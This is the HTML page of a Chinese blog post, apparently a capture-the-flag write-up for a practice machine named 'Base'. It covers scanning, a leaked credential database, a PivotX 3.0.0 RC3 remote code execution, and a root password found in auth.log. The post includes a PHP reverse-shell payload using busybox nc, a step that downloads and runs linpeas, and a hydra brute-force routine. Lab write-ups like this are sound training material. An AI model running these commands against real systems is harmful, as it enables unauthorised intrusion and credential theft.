@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️
+知识点：信息收集，目录扫描，`sqlite3`读数据库，`PivotX 3.0.0 RC3 RCE`,检索系统日志
+```
+
+### 2. 信息收集
+
+##### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.72   08:00:27:77:12:c7       PCS Systemtechnik GmbH
+└─# IP=192.168.31.72
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 19:16 CST
+Nmap scan report for Base (192.168.31.72)
+Host is up (0.0017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-generator: PivotX
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-robots.txt: 1 disallowed entry
+|_/pivotx/
+|_http-title:         PivotX Powered
+MAC Address: 08:00:27:77:12:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口,先常规扫一下目录
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[19:17:35] Starting:
+[19:17:46] 301 -  315B  - /images  ->  http://192.168.31.72/images/
+[19:17:46] 200 -  175B  - /images/
+[19:17:47] 200 -    5KB - /LICENSE.txt
+[19:17:52] 200 -  311B  - /README.md
+[19:17:52] 200 -   33B  - /robots.txt
+[19:17:55] 200 -  487B  - /UPGRADE.txt
+[19:17:56] 200 -   12KB - /users.db
+```
+
+访问`80`端口没啥有用信息，访问 `robots.txt` 提示`pivotx`目录，访问目录下有一个登陆页面，测试root、admin等弱密码不行,做到后面发现`var/www/html/creds.txt`给了账号信息
+
+```shell
+http://192.168.31.72/pivotx/index.php
+
+hungry@Base:/tmp$ cat  /var/www/html/creds.txt
+guest:guest
+admin:YWRtaW*=
+```
+
+扫描到`users.db`数据库，读取后存在用户`hungry/aHVuZ3J5`
+
+```shell
+└─# file users.db
+users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+└─# sqlite3 users.db
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter '.help' for usage hints.
+sqlite> .tables
+users
+sqlite> SELECT * FROM users;
+id  username  password
+--  --------  --------
+1   hungry    aHVuZ3J5
+```
+
+尝试账号`hungry/aHVuZ3J5`网页登陆不对，去试试`ssh`登陆
+
+![image-20250723193402371](https://gitee.com/shui666/images/raw/master/images/image-20250723193402371.png)
+
+### 3.获得`hungry`权限
+
+直接拿`users.db`数据库中用户`hungry/aHVuZ3J5`去`ssh`登陆靶机成功
+
+```
+└─# ssh hungry@$IP
+hungry@Base:~$ id
+uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
+```
+
+写个公钥方便登陆
+
+```
+#配置免密登陆
+mkdir .ssh
+cd .ssh
+echo '<公钥>'>>authorized_keys
+```
+
+
+
+##### 拿到`user.txt`
+
+```shell
+hungry@Base:~$ cd
+hungry@Base:~$ ls
+user.txt
+hungry@Base:~$ cat user.txt
+flag{user-051a0db9a92e4dacc70212da32fd0638}
+```
+
+
+
+### 4.获得`www-data`权限
+
+没有`sudo`可以执行，传个脚本扫一下
+
+```shell
+kali└─# python3 -m http.server 80
+
+hungry@Base:/tmp$ wget  192.168.31.126/linpeas.sh
+hungry@Base:/tmp$ chmod +x linpeas.sh
+hungry@Base:/tmp$ bash linpeas.sh
+```
+
+发现`ssh`的配置文件中允许`root`登陆,尝试直接用`top`字典`ssh`爆破`root`密码失败
+
+```
+hungry@Base:~$ cat /etc/ssh/sshd_config| grep -i  root
+PermitRootLogin yes
+# the setting of 'PermitRootLogin without-password'.
+#ChrootDirectory none
+```
+
+然后注意到已知账户的密码都是`base64`
+
+```
+hungry->aHVuZ3J5
+guest:guest
+admin:YWRtaW*=
+```
+
+群主提示了`www-data`有用，回到登陆页面`/pivotx/index.php`，使用`admin/YWRtaW4=`成功登陆后台
+
+![image-20250723210753096](https://gitee.com/shui666/images/raw/master/images/image-20250723210753096.png)
+
+搜索发现`PivotX`是`PivotX`开源的一个应用程序。">
+<meta property="og:title" content="群友靶机：Base 20250723">
+<meta property="og:description" content="
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️
+知识点：信息收集，目录扫描，`sqlite3`读数据库，`PivotX 3.0.0 RC3 RCE`,检索系统日志
+```
+
+### 2. 信息收集
+
+##### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.72   08:00:27:77:12:c7       PCS Systemtechnik GmbH
+└─# IP=192.168.31.72
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 19:16 CST
+Nmap scan report for Base (192.168.31.72)
+Host is up (0.0017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-generator: PivotX
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+| http-robots.txt: 1 disallowed entry
+|_/pivotx/
+|_http-title:         PivotX Powered
+MAC Address: 08:00:27:77:12:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80`端口,先常规扫一下目录
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[19:17:35] Starting:
+[19:17:46] 301 -  315B  - /images  ->  http://192.168.31.72/images/
+[19:17:46] 200 -  175B  - /images/
+[19:17:47] 200 -    5KB - /LICENSE.txt
+[19:17:52] 200 -  311B  - /README.md
+[19:17:52] 200 -   33B  - /robots.txt
+[19:17:55] 200 -  487B  - /UPGRADE.txt
+[19:17:56] 200 -   12KB - /users.db
+```
+
+访问`80`端口没啥有用信息，访问 `robots.txt` 提示`pivotx`目录，访问目录下有一个登陆页面，测试root、admin等弱密码不行,做到后面发现`var/www/html/creds.txt`给了账号信息
+
+```shell
+http://192.168.31.72/pivotx/index.php
+
+hungry@Base:/tmp$ cat  /var/www/html/creds.txt
+guest:guest
+admin:YWRtaW*=
+```
+
+扫描到`users.db`数据库，读取后存在用户`hungry/aHVuZ3J5`
+
+```shell
+└─# file users.db
+users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+└─# sqlite3 users.db
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter '.help' for usage hints.
+sqlite> .tables
+users
+sqlite> SELECT * FROM users;
+id  username  password
+--  --------  --------
+1   hungry    aHVuZ3J5
+```
+
+尝试账号`hungry/aHVuZ3J5`网页登陆不对，去试试`ssh`登陆
+
+![image-20250723193402371](https://gitee.com/shui666/images/raw/master/images/image-20250723193402371.png)
+
+### 3.获得`hungry`权限
+
+直接拿`users.db`数据库中用户`hungry/aHVuZ3J5`去`ssh`登陆靶机成功
+
+```
+└─# ssh hungry@$IP
+hungry@Base:~$ id
+uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
+```
+
+写个公钥方便登陆
+
+```
+#配置免密登陆
+mkdir .ssh
+cd .ssh
+echo '<公钥>'>>authorized_keys
+```
+
+
+
+##### 拿到`user.txt`
+
+```shell
+hungry@Base:~$ cd
+hungry@Base:~$ ls
+user.txt
+hungry@Base:~$ cat user.txt
+flag{user-051a0db9a92e4dacc70212da32fd0638}
+```
+
+
+
+### 4.获得`www-data`权限
+
+没有`sudo`可以执行，传个脚本扫一下
+
+```shell
+kali└─# python3 -m http.server 80
+
+hungry@Base:/tmp$ wget  192.168.31.126/linpeas.sh
+hungry@Base:/tmp$ chmod +x linpeas.sh
+hungry@Base:/tmp$ bash linpeas.sh
+```
+
+发现`ssh`的配置文件中允许`root`登陆,尝试直接用`top`字典`ssh`爆破`root`密码失败
+
+```
+hungry@Base:~$ cat /etc/ssh/sshd_config| grep -i  root
+PermitRootLogin yes
+# the setting of 'PermitRootLogin without-password'.
+#ChrootDirectory none
+```
+
+然后注意到已知账户的密码都是`base64`
+
+```
+hungry->aHVuZ3J5
+guest:guest
+admin:YWRtaW*=
+```
+
+群主提示了`www-data`有用，回到登陆页面`/pivotx/index.php`，使用`admin/YWRtaW4=`成功登陆后台
+
+![image-20250723210753096](https://gitee.com/shui666/images/raw/master/images/image-20250723210753096.png)
+
+搜索发现`PivotX`是`PivotX`开源的一个应用程序。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9ABase%2020250723.html">
+<meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
+<title>群友靶机：Base 20250723</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">群友靶机：Base 20250723</h1>
+<div class="title-right">
+    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/12" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>1. 基本信息</h3>
+<pre class="notranslate"><code class="notranslate">靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️
+知识点：信息收集，目录扫描，<span class="pl-s"><span class="pl-pds">`</span>sqlite3<span class="pl-pds">`</span></span>读数据库，<span class="pl-s"><span class="pl-pds">`</span>PivotX 3.0.0 RC3 RCE<span class="pl-pds">`</span></span>,检索系统日志</pre></div>
+<h3>2. 信息收集</h3>
+<h5>Nmap</h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+192.168.31.72   08:00:27:77:12:c7       PCS Systemtechnik GmbH
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.72</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 19:16 CST
+Nmap scan report <span class="pl-k">for</span> Base (192.168.31.72)
+Host is up (0.0017s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-generator: PivotX
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span> http-cookie-flags:
+<span class="pl-k">|</span>   /:
+<span class="pl-k">|</span>     PHPSESSID:
+<span class="pl-k">|</span>_      httponly flag not <span class="pl-c1">set</span>
+<span class="pl-k">|</span> http-robots.txt: 1 disallowed entry
+<span class="pl-k">|</span>_/pivotx/
+<span class="pl-k">|</span>_http-title:         PivotX Powered
+MAC Address: 08:00:27:77:12:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
+<p>开放了<code class="notranslate">22、80</code>端口,先常规扫一下目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+[19:17:35] Starting:
+[19:17:46] 301 -  315B  - /images  -<span class="pl-k">&gt;</span>  http://192.168.31.72/images/
+[19:17:46] 200 -  175B  - /images/
+[19:17:47] 200 -    5KB - /LICENSE.txt
+[19:17:52] 200 -  311B  - /README.md
+[19:17:52] 200 -   33B  - /robots.txt
+[19:17:55] 200 -  487B  - /UPGRADE.txt
+[19:17:56] 200 -   12KB - /users.db</pre></div>
+<p>访问<code class="notranslate">80</code>端口没啥有用信息，访问 <code class="notranslate">robots.txt</code> 提示<code class="notranslate">pivotx</code>目录，访问目录下有一个登陆页面，测试root、admin等弱密码不行,做到后面发现<code class="notranslate">var/www/html/creds.txt</code>给了账号信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.31.72/pivotx/index.php
+
+hungry@Base:/tmp$ cat  /var/www/html/creds.txt
+guest:guest
+admin:YWRtaW<span class="pl-k">*</span>=</pre></div>
+<p>扫描到<code class="notranslate">users.db</code>数据库，读取后存在用户<code class="notranslate">hungry/aHVuZ3J5</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> file users.db</span>
+users.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2
+└─<span class="pl-c"><span class="pl-c">#</span> sqlite3 users.db</span>
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter <span class="pl-s"><span class="pl-pds">"</span>.help<span class="pl-pds">"</span></span> <span class="pl-k">for</span> usage hints.
+sqlite<span class="pl-k">&gt;</span> .tables
+users
+sqlite<span class="pl-k">&gt;</span> SELECT <span class="pl-k">*</span> FROM users<span class="pl-k">;</span>
+id  username  password
+--  --------  --------
+1   hungry    aHVuZ3J5</pre></div>
+<p>尝试账号<code class="notranslate">hungry/aHVuZ3J5</code>网页登陆不对，去试试<code class="notranslate">ssh</code>登陆</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/098c52812d51913489ff1ed11ff9b7ddc525f201d8f32670cb1bd3fdc1668bc8/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303732333139333430323337312e706e67"><img src="https://camo.githubusercontent.com/098c52812d51913489ff1ed11ff9b7ddc525f201d8f32670cb1bd3fdc1668bc8/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303732333139333430323337312e706e67" alt="image-20250723193402371" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250723193402371.png" style="max-width: 100%;"></a></p>
+<h3>3.获得<code class="notranslate">hungry</code>权限</h3>
+<p>直接拿<code class="notranslate">users.db</code>数据库中用户<code class="notranslate">hungry/aHVuZ3J5</code>去<code class="notranslate">ssh</code>登陆靶机成功</p>
+<pre class="notranslate"><code class="notranslate">└─# ssh hungry@$IP
+hungry@Base:~$ id
+uid=1000(hungry) gid=1000(hungry) groups=1000(hungry)
+</code></pre>
+<p>写个公钥方便登陆</p>
+<pre class="notranslate"><code class="notranslate">#配置免密登陆
+mkdir .ssh
+cd .ssh
+echo '&lt;公钥&gt;'&gt;&gt;authorized_keys
+</code></pre>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">hungry@Base:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+hungry@Base:<span class="pl-k">~</span>$ ls
+user.txt
+hungry@Base:<span class="pl-k">~</span>$ cat user.txt
+flag{user-051a0db9a92e4dacc70212da32fd0638}</pre></div>
+<h3>4.获得<code class="notranslate">www-data</code>权限</h3>
+<p>没有<code class="notranslate">sudo</code>可以执行，传个脚本扫一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> python3 -m http.server 80</span>
+
+hungry@Base:/tmp$ wget  192.168.31.126/linpeas.sh
+hungry@Base:/tmp$ chmod +x linpeas.sh
+hungry@Base:/tmp$ bash linpeas.sh</pre></div>
+<p>发现<code class="notranslate">ssh</code>的配置文件中允许<code class="notranslate">root</code>登陆,尝试直接用<code class="notranslate">top</code>字典<code class="notranslate">ssh</code>爆破<code class="notranslate">root</code>密码失败</p>
+<pre class="notranslate"><code class="notranslate">hungry@Base:~$ cat /etc/ssh/sshd_config| grep -i  root
+PermitRootLogin yes
+# the setting of "PermitRootLogin without-password".
+#ChrootDirectory none
+</code></pre>
+<p>然后注意到已知账户的密码都是<code class="notranslate">base64</code></p>
+<pre class="notranslate"><code class="notranslate">hungry-&gt;aHVuZ3J5
+guest:guest
+admin:YWRtaW*=
+</code></pre>
+<p>群主提示了<code class="notranslate">www-data</code>有用，回到登陆页面<code class="notranslate">/pivotx/index.php</code>，使用<code class="notranslate">admin/YWRtaW4=</code>成功登陆后台</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6276eeb844eac8f0d6585e96f8627a67aae239faece26fe134bf33ac95eece2d/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303732333231303735333039362e706e67"><img src="https://camo.githubusercontent.com/6276eeb844eac8f0d6585e96f8627a67aae239faece26fe134bf33ac95eece2d/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303732333231303735333039362e706e67" alt="image-20250723210753096" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250723210753096.png" style="max-width: 100%;"></a></p>
+<p>搜索发现<code class="notranslate">PivotX</code>是<code class="notranslate">PivotX</code>开源的一个应用程序。<code class="notranslate"> PivotX 3.0.0 RC3</code>版本存在安全漏洞，该漏洞源于页面创建过程中，容易受到存储型跨站脚本攻击。</p>
+<h5><code class="notranslate">CVE-2025-52367</code>(PivotX 3.0.0 RC3 RCE)</h5>
+<p>直接用<code class="notranslate">https://www.exploit-db.com/</code>现成的方案PivotX 3.0.0 RC3 - Remote Code Execution (RCE)</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>PivotX 3.0.0 RC3 - Remote Code Execution (RCE)</span>
+https://www.exploit-db.com/exploits/52361</pre></div>
+<p>运行即可获得<code class="notranslate">www-data</code>权限</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>使用admin登陆后获取shell方法</span>
+8. Navigate as admin, to http://IP/PivotX/pivotx/index.php<span class="pl-k">?</span>page=homeexplore, where you can edit index.php file
+9. Edit index.php file to any php file you want to gain RCE on the target, could be with reverse shell or any other method.
+10. Visit http://IP/PivotX/index.php and you should get a reverse shell :)
+<span class="pl-c"><span class="pl-c">#</span>#执行结果</span>
+<span class="pl-c"><span class="pl-c">#</span>访问homeexplore目标页面</span>
+http://192.168.31.70/pivotx/index.php<span class="pl-k">?</span>page=homeexplore
+<span class="pl-c"><span class="pl-c">#</span>编辑index.php内容为反弹shell参数（靶机无nc用busybox）</span>
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php exec(<span class="pl-s"><span class="pl-pds">"</span>busybox nc 192.168.31.126 1234 -e /bin/bash <span class="pl-pds">"</span></span>)<span class="pl-k">;</span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-c"><span class="pl-c">#</span>获得反弹shell</span>
+kali└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.70/index.php</span>
+kali└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234</span>
+listening on [any] 1234 ...
+id
+connect to [192.168.31.126] from Base [192.168.31.70] 46300
+
+www-data@Base:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)</pre></div>
+<h3>5.获得<code class="notranslate">root</code>权限</h3>
+<h5>检索系统日志</h5>
+<p>注意到<code class="notranslate">www-data</code>用户的属组有<code class="notranslate">adm</code>，<code class="notranslate">adm</code>属组默认有权访问 <code class="notranslate">/var/log/</code>下的系统日志（如 <code class="notranslate">auth.log</code>、<code class="notranslate">syslog</code>），去日志中找找敏感信息，在<code class="notranslate">auth.log</code>中发现<code class="notranslate">root</code>密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Base:/tmp$ cat /var/log/auth.log <span class="pl-k">|</span> grep <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>
+Jul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed
+<span class="pl-k">for</span> root
+Jul 19 23:58:27 moban sudo[381]: root <span class="pl-c1">:</span> password changed to <span class="pl-s"><span class="pl-pds">'</span>dG9kZA==</span>
+<span class="pl-s">Jul 20 00:05:17 moban sshd[548]: Accepted password for root from 192.168.3.94 po</span>
+<span class="pl-s">rt 60280 ssh2</span>
+<span class="pl-s">Jul 20 00:10:50 moban passwd[831]: pam_unix(passwd:chauthtok): password changed</span>
+<span class="pl-s">for hungry</span>
+<span class="pl-s">Jul 20 00:30:55 moban passwd[1026]: pam_unix(passwd:chauthtok): password changed</span>
+<span class="pl-s"> for hungry</span>
+<span class="pl-s">Jul 20 00:31:43 moban sshd[1031]: Accepted password for root from 192.168.3.94 p</span>
+<span class="pl-s">ort 36218 ssh2</span>
+<span class="pl-s">Jul 20 00:32:02 moban passwd[1044]: pam_unix(passwd:chauthtok): password changed</span>
+<span class="pl-s"> for root</span>
+<span class="pl-s">Jul 20 00:44:17 Base sshd[433]: Accepted password for root from 192.168.3.94 por</span>
+<span class="pl-s">t 47964 ssh2</span>
+<span class="pl-s">Jul 20 00:52:12 Base sshd[433]: Accepted password for root from 192.168.3.94 por</span>
+<span class="pl-s">t 55854 ssh2</span>
+<span class="pl-s">Jul 23 10:23:06 Base sshd[780]: Accepted password for hungry from 192.168.31.126</span>
+<span class="pl-s"> port 58554 ssh2</span>
+<span class="pl-s">Jul 23 10:36:12 Base sudo: pam_unix(sudo:auth): auth could not identify password</span>
+<span class="pl-s"> for [www-data]</span>
+<span class="pl-s">Jul 23 10:40:21 Base sudo: pam_unix(sudo:auth): auth could not identify password</span>
+<span class="pl-s"> for [hungry]</span></pre></div>
+<p>获得<code class="notranslate">root</code>密码为<code class="notranslate">dG9kZA==</code>，解码是<code class="notranslate">todd</code>果然很切题。</p>
+<h5>拿到<code class="notranslate">root.txt</code></h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Base:/tmp$ su
+Password:<span class="pl-c"><span class="pl-c">#</span>dG9kZA==</span>
+ ____
+<span class="pl-k">|</span> __ )  __ _ ___  ___
+<span class="pl-k">|</span>  _ <span class="pl-cce">\ </span>/ _<span class="pl-s"><span class="pl-pds">`</span> / __<span class="pl-k">|</span>/ _ \</span>
+<span class="pl-s"><span class="pl-k">|</span> <span class="pl-k">|</span>_) <span class="pl-k">|</span> (_<span class="pl-k">|</span> <span class="pl-cce">\_</span>_ <span class="pl-cce">\ </span> __/</span>
+<span class="pl-s"><span class="pl-k">|</span>____/ <span class="pl-cce">\_</span>_,_<span class="pl-k">|</span>___/<span class="pl-cce">\_</span>__<span class="pl-k">|</span></span>
+<span class="pl-s"></span>
+<span class="pl-s">root@Base:/tmp# id</span>
+<span class="pl-s">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="pl-s">root@Base:/tmp# ls</span>
+<span class="pl-s">root@Base:/tmp# cat /root/root.txt</span>
+<span class="pl-s">flag{root}</span></pre></div>
+<h5>后记</h5>
+<p>既然靶机的密码都是<code class="notranslate">base64</code>格式，也直接构造<code class="notranslate">base64</code>字典去爆破<code class="notranslate">root</code>密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>夜佬的脚本</span>
+<span class="pl-k">while</span> IFS= <span class="pl-c1">read</span> -r line<span class="pl-k">;</span> <span class="pl-k">do</span>
+    <span class="pl-c1">echo</span> -n <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$line</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> base64
+<span class="pl-k">done</span> <span class="pl-k">&lt;</span> /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt <span class="pl-k">&gt;</span> 10000base.txt
+└─<span class="pl-c"><span class="pl-c">#</span> hydra -l rootin -P 10000base.txt ssh://$IP  -V -I -u -f -e nsr</span></pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://pingsag3.github.io">Pingsag3 Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
